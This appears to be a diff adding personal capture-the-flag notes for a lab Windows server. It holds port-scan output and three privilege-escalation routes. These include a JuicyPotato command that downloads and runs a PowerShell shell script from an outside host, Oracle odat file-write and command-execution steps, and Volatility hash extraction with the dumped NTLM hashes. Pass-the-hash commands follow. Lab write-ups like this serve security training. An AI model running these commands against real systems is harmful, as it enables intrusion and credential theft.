@@ -1,0 +1,78 @@
+80/tcp    open  http         Microsoft IIS httpd 8.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: IIS Windows Server
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
+49160/tcp open  msrpc        Microsoft Windows RPC
+49161/tcp open  msrpc        Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+
+
+Foothold:
+--sysdba + putFile
+
+
+
+Privesc 1: JuicyPotato
+
+.\JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.13/shell.ps1')" -t *
+
+
+
+Privesc 2: odat
+
+if u run tasklist /v, u realise that oracle is running on root privs
+use odat ctxsys with --getfile (with --sysdba)
+or if you want a shell, add a shell using odat utlfile --putfile (with --sysdba); then to execute run odat externaltable --exec (with --sysdba)
+
+
+
+Privesc 3: dropbox
+
+?%Hm8646uC$ -> ? causing the error, work around:
+$fc = Get-Content "Oracle Issue.txt"
+$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
+[System.Convert]::ToBase64String($fe)
+£%Hm8646uC$
+
+install volatility https://www.volatilityfoundation.org/26
+
+./volatility_2.6_lin64_standalone -f ../Downloads/SILO-20180105-221806.dmp imageinfo 
+
+./volatility_2.6_lin64_standalone kdbgscan -f ../Downloads/SILO-20180105-221806.dmp 
+
+./volatility_2.6_lin64_standalone -f ../Downloads/SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
+
+./volatility_2.6_lin64_standalone -f ../Downloads/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.129.149.144 cmd
+
+sudo python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7" -target-ip 10.129.149.144 SILO/Administrator@10.129.149.144
+
+crackmapexec smb -u Administrator -d SILO -H 'aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7' 10.129.149.144  
+
+evil-winrm -u Administrator -H 9e730375b7cbcebf74ae46481e07b0c7 -i 10.129.149.144 
+
+couldnt get the 3rd way to work
+
+
+
+
+
+
+
+
